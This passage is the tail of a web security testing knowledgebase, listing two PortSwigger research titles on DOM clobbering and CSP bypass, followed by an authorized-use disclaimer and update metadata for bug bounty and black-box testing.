- **"DOM Clobbering Strikes Back"** — PortSwigger
- **"Bypassing CSP with Policy Injection"** — PortSwigger

---

> **Disclaimer:** This knowledgebase is intended for authorized security testing and educational purposes only. Always obtain proper authorization before testing any application. The techniques described here can cause harm if used maliciously.

> **Last Updated:** 2026-05-23  
> **Maintained for:** Advanced Bug Bounty Hunting & Black-Box Testing  
> **Classification:** Research-Grade Technical Reference
